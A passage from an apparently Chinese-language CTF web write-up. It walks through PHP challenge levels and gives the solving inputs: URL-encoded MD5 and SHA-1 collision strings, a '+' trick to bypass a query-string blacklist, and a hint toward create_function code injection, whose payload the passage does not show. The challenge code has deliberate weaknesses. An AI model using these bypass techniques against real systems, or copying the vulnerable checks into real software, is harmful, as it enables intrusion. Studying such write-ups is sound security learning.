selector\">%00</span><span class=\"token placeholder selector\">%A8</span><span class=\"token placeholder selector\">%28K</span><span class=\"token placeholder selector\">%F3n</span><span class=\"token placeholder selector\">%8EKU</span><span class=\"token placeholder selector\">%B3_Bu</span><span class=\"token placeholder selector\">%93</span><span class=\"token placeholder selector\">%D8Igm</span><span class=\"token placeholder selector\">%A0</span><span class=\"token placeholder selector\">%D1U</span><span class=\"token placeholder selector\">%5D</span><span class=\"token placeholder selector\">%83</span><span class=\"token placeholder selector\">%60</span><span class=\"token placeholder selector\">%FB_</span><span class=\"token placeholder selector\">%07</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%A2</span>&amp;array2=M<span class=\"token placeholder selector\">%C9h</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%0E</span><span class=\"token placeholder selector\">%E3</span><span class=\"token placeholder selector\">%5C</span><span class=\"token placeholder selector\">%20</span><span class=\"token placeholder selector\">%95r</span><span class=\"token placeholder selector\">%D4w</span><span class=\"token placeholder selector\">%7Br</span><span class=\"token placeholder selector\">%15</span><span class=\"token placeholder selector\">%87</span><span class=\"token placeholder selector\">%D3o</span><span class=\"token placeholder selector\">%A7</span><span class=\"token placeholder selector\">%B2</span><span class=\"token placeholder selector\">%1B</span><span class=\"token placeholder selector\">%DCV</span><span class=\"token placeholder selector\">%B7J</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%C0x</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%7B</span><span class=\"token placeholder selector\">%95</span><span class=\"token placeholder selector\">%18</span><span class=\"token placeholder selector\">%AF</span><span class=\"token placeholder selector\">%BF</span><span class=\"token placeholder selector\">%A2</span><span class=\"token placeholder selector\">%02</span><span class=\"token placeholder selector\">%A8</span><span class=\"token placeholder selector\">%28K</span><span class=\"token placeholder selector\">%F3n</span><span class=\"token placeholder selector\">%8EKU</span><span class=\"token placeholder selector\">%B3_Bu</span><span class=\"token placeholder selector\">%93</span><span class=\"token placeholder selector\">%D8Igm</span><span class=\"token placeholder selector\">%A0</span><span class=\"token placeholder selector\">%D1</span><span class=\"token placeholder selector\">%D5</span><span class=\"token placeholder selector\">%5D</span><span class=\"token placeholder selector\">%83</span><span class=\"token placeholder selector\">%60</span><span class=\"token placeholder selector\">%FB_</span><span class=\"token placeholder selector\">%07</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%A2</span></pre></td></tr></table></figure><p>得到回显：</p>\n<p>Level___3.php</p>\n<p>访问：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//here is level 3</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"str.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$a1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$a2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'array2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$a2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"????\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$level4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"level 3 failed ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>和刚刚同理，只不过把 md5 换成了 sha：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>array1=<span class=\"token placeholder selector\">%25PDF-1</span>.3<span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%25</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%E3</span><span class=\"token placeholder selector\">%CF</span><span class=\"token placeholder selector\">%D3</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%0A1</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20obj</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%3C</span><span class=\"token placeholder selector\">%3C</span>/Width<span class=\"token placeholder selector\">%202</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Height<span class=\"token placeholder selector\">%203</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Type<span class=\"token placeholder selector\">%204</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Subtype<span class=\"token placeholder selector\">%205</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Filter<span class=\"token placeholder selector\">%206</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/ColorSpace<span class=\"token placeholder selector\">%207</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Length<span class=\"token placeholder selector\">%208</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/BitsPerComponent<span class=\"token placeholder selector\">%208</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%0Astream</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%D8</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%00</span><span class=\"token placeholder selector\">%24SHA-1</span><span class=\"token placeholder selector\">%20is</span><span class=\"token placeholder selector\">%20dead</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%85</span>/<span class=\"token placeholder selector\">%EC</span><span class=\"token placeholder selector\">%09</span><span class=\"token placeholder selector\">%239u</span><span class=\"token placeholder selector\">%9C9</span><span class=\"token placeholder selector\">%B1</span><span class=\"token placeholder selector\">%A1</span><span class=\"token placeholder selector\">%C6</span><span class=\"token placeholder selector\">%3CL</span><span class=\"token placeholder selector\">%97</span><span class=\"token placeholder selector\">%E1</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%01</span><span class=\"token placeholder selector\">%7FF</span><span class=\"token placeholder selector\">%DC</span><span class=\"token placeholder selector\">%93</span><span class=\"token placeholder selector\">%A6</span><span class=\"token placeholder selector\">%B6</span><span class=\"token placeholder selector\">%7E</span><span class=\"token placeholder selector\">%01</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%02</span><span class=\"token placeholder selector\">%9A</span><span class=\"token placeholder selector\">%AA</span><span class=\"token placeholder selector\">%1D</span><span class=\"token placeholder selector\">%B2V</span><span class=\"token placeholder selector\">%0BE</span><span class=\"token placeholder selector\">%CAg</span><span class=\"token placeholder selector\">%D6</span><span class=\"token placeholder selector\">%88</span><span class=\"token placeholder selector\">%C7</span><span class=\"token placeholder selector\">%F8K</span><span class=\"token placeholder selector\">%8CLy</span><span class=\"token placeholder selector\">%1F</span><span class=\"token placeholder selector\">%E0</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%F6</span><span class=\"token placeholder selector\">%14</span><span class=\"token placeholder selector\">%F8m</span><span class=\"token placeholder selector\">%B1i</span><span class=\"token placeholder selector\">%09</span><span class=\"token placeholder selector\">%01</span><span class=\"token placeholder selector\">%C5kE</span><span class=\"token placeholder selector\">%C1S</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%DF</span><span class=\"token placeholder selector\">%B7</span><span class=\"token placeholder selector\">%608</span><span class=\"token placeholder selector\">%E9rr</span>/<span class=\"token placeholder selector\">%E7</span><span class=\"token placeholder selector\">%ADr</span><span class=\"token placeholder selector\">%8F</span><span class=\"token placeholder selector\">%0EI</span><span class=\"token placeholder selector\">%04</span><span class=\"token placeholder selector\">%E0F</span><span class=\"token placeholder selector\">%C20W</span><span class=\"token placeholder selector\">%0F</span><span class=\"token placeholder selector\">%E9</span><span class=\"token placeholder selector\">%D4</span><span class=\"token placeholder selector\">%13</span><span class=\"token placeholder selector\">%98</span><span class=\"token placeholder selector\">%AB</span><span class=\"token placeholder selector\">%E1</span>.<span class=\"token placeholder selector\">%F5</span><span class=\"token placeholder selector\">%BC</span><span class=\"token placeholder selector\">%94</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%E35B</span><span class=\"token placeholder selector\">%A4</span><span class=\"token placeholder selector\">%80-</span><span class=\"token placeholder selector\">%98</span><span class=\"token placeholder selector\">%B5</span><span class=\"token placeholder selector\">%D7</span><span class=\"token placeholder selector\">%0F</span><span class=\"token placeholder selector\">%2A3</span>.<span class=\"token placeholder selector\">%C3</span><span class=\"token placeholder selector\">%7F</span><span class=\"token placeholder selector\">%AC5</span><span class=\"token placeholder selector\">%14</span><span class=\"token placeholder selector\">%E7M</span><span class=\"token placeholder selector\">%DC</span><span class=\"token placeholder selector\">%0F</span><span class=\"token placeholder selector\">%2C</span><span class=\"token placeholder selector\">%C1</span><span class=\"token placeholder selector\">%A8t</span><span class=\"token placeholder selector\">%CD</span><span class=\"token placeholder selector\">%0Cx0Z</span><span class=\"token placeholder selector\">%21Vda0</span><span class=\"token placeholder selector\">%97</span><span class=\"token placeholder selector\">%89</span><span class=\"token placeholder selector\">%60k</span><span class=\"token placeholder selector\">%D0</span><span class=\"token placeholder selector\">%BF</span><span class=\"token placeholder selector\">%3F</span><span class=\"token placeholder selector\">%98</span><span class=\"token placeholder selector\">%CD</span><span class=\"token placeholder selector\">%A8</span><span class=\"token placeholder selector\">%04F</span><span class=\"token placeholder selector\">%29</span><span class=\"token placeholder selector\">%A1</span>&amp;array2=<span class=\"token placeholder selector\">%25PDF-1</span>.3<span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%25</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%E3</span><span class=\"token placeholder selector\">%CF</span><span class=\"token placeholder selector\">%D3</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%0A1</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20obj</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%3C</span><span class=\"token placeholder selector\">%3C</span>/Width<span class=\"token placeholder selector\">%202</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Height<span class=\"token placeholder selector\">%203</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Type<span class=\"token placeholder selector\">%204</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Subtype<span class=\"token placeholder selector\">%205</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Filter<span class=\"token placeholder selector\">%206</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/ColorSpace<span class=\"token placeholder selector\">%207</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/Length<span class=\"token placeholder selector\">%208</span><span class=\"token placeholder selector\">%200</span><span class=\"token placeholder selector\">%20R</span>/BitsPerComponent<span class=\"token placeholder selector\">%208</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%3E</span><span class=\"token placeholder selector\">%0Astream</span><span class=\"token placeholder selector\">%0A</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%D8</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%00</span><span class=\"token placeholder selector\">%24SHA-1</span><span class=\"token placeholder selector\">%20is</span><span class=\"token placeholder selector\">%20dead</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%85</span>/<span class=\"token placeholder selector\">%EC</span><span class=\"token placeholder selector\">%09</span><span class=\"token placeholder selector\">%239u</span><span class=\"token placeholder selector\">%9C9</span><span class=\"token placeholder selector\">%B1</span><span class=\"token placeholder selector\">%A1</span><span class=\"token placeholder selector\">%C6</span><span class=\"token placeholder selector\">%3CL</span><span class=\"token placeholder selector\">%97</span><span class=\"token placeholder selector\">%E1</span><span class=\"token placeholder selector\">%FF</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%01sF</span><span class=\"token placeholder selector\">%DC</span><span class=\"token placeholder selector\">%91f</span><span class=\"token placeholder selector\">%B6</span><span class=\"token placeholder selector\">%7E</span><span class=\"token placeholder selector\">%11</span><span class=\"token placeholder selector\">%8F</span><span class=\"token placeholder selector\">%02</span><span class=\"token placeholder selector\">%9A</span><span class=\"token placeholder selector\">%B6</span><span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%B2V</span><span class=\"token placeholder selector\">%0F</span><span class=\"token placeholder selector\">%F9</span><span class=\"token placeholder selector\">%CAg</span><span class=\"token placeholder selector\">%CC</span><span class=\"token placeholder selector\">%A8</span><span class=\"token placeholder selector\">%C7</span><span class=\"token placeholder selector\">%F8</span><span class=\"token placeholder selector\">%5B</span><span class=\"token placeholder selector\">%A8Ly</span><span class=\"token placeholder selector\">%03</span><span class=\"token placeholder selector\">%0C</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%18</span><span class=\"token placeholder selector\">%F8m</span><span class=\"token placeholder selector\">%B3</span><span class=\"token placeholder selector\">%A9</span><span class=\"token placeholder selector\">%09</span><span class=\"token placeholder selector\">%01</span><span class=\"token placeholder selector\">%D5</span><span class=\"token placeholder selector\">%DFE</span><span class=\"token placeholder selector\">%C1O</span><span class=\"token placeholder selector\">%26</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%DF</span><span class=\"token placeholder selector\">%B3</span><span class=\"token placeholder selector\">%DC8</span><span class=\"token placeholder selector\">%E9j</span><span class=\"token placeholder selector\">%C2</span>/<span class=\"token placeholder selector\">%E7</span><span class=\"token placeholder selector\">%BDr</span><span class=\"token placeholder selector\">%8F</span><span class=\"token placeholder selector\">%0EE</span><span class=\"token placeholder selector\">%BC</span><span class=\"token placeholder selector\">%E0F</span><span class=\"token placeholder selector\">%D2</span><span class=\"token placeholder selector\">%3CW</span><span class=\"token placeholder selector\">%0F</span><span class=\"token placeholder selector\">%EB</span><span class=\"token placeholder selector\">%14</span><span class=\"token placeholder selector\">%13</span><span class=\"token placeholder selector\">%98</span><span class=\"token placeholder selector\">%BBU</span>.<span class=\"token placeholder selector\">%F5</span><span class=\"token placeholder selector\">%A0</span><span class=\"token placeholder selector\">%A8</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%E31</span><span class=\"token placeholder selector\">%FE</span><span class=\"token placeholder selector\">%A4</span><span class=\"token placeholder selector\">%807</span><span class=\"token placeholder selector\">%B8</span><span class=\"token placeholder selector\">%B5</span><span class=\"token placeholder selector\">%D7</span><span class=\"token placeholder selector\">%1F</span><span class=\"token placeholder selector\">%0E3</span>.<span class=\"token placeholder selector\">%DF</span><span class=\"token placeholder selector\">%93</span><span class=\"token placeholder selector\">%AC5</span><span class=\"token placeholder selector\">%00</span><span class=\"token placeholder selector\">%EBM</span><span class=\"token placeholder selector\">%DC</span><span class=\"token placeholder selector\">%0D</span><span class=\"token placeholder selector\">%EC</span><span class=\"token placeholder selector\">%C1</span><span class=\"token placeholder selector\">%A8dy</span><span class=\"token placeholder selector\">%0Cx</span><span class=\"token placeholder selector\">%2Cv</span><span class=\"token placeholder selector\">%21V</span><span class=\"token placeholder selector\">%60</span><span class=\"token placeholder selector\">%DD0</span><span class=\"token placeholder selector\">%97</span><span class=\"token placeholder selector\">%91</span><span class=\"token placeholder selector\">%D0k</span><span class=\"token placeholder selector\">%D0</span><span class=\"token placeholder selector\">%AF</span><span class=\"token placeholder selector\">%3F</span><span class=\"token placeholder selector\">%98</span><span class=\"token placeholder selector\">%CD</span><span class=\"token placeholder selector\">%A4</span><span class=\"token placeholder selector\">%BCF</span><span class=\"token placeholder selector\">%29</span><span class=\"token placeholder selector\">%B1</span></pre></td></tr></table></figure><p>得到回显 level_level_4.php</p>\n<p>访问：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//here is last level</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"str.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_URI'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"give me a parameter\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |_|20|5f|2e|\\./'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"blacklist here\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'NI_SA_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"txw4ever\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$level5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"level 4 failed ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>give me a parameterlevel 4 failed ...</pre></td></tr></table></figure><p>用 + 绕过正则匹配，原理见 https://p1kap1.github.io/CTF/web/SICTF2023-Round2/。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/level_level_4.php?NI+SA+=txw4ever</pre></td></tr></table></figure><p>得到回显：</p>\n<p>55_5_55.php</p>\n<p>访问：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//sorry , here is true last level</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//^_^</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"str.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9_]*$/isD'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这种    <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><msup><mo stretchy=\"false\">(</mo><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">a(&#x27;&#x27;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\"><span class=\"mopen\">(</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span></span>b);  句式猜到是使用 creation_function 函数绕过。</p>\n<p>具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" 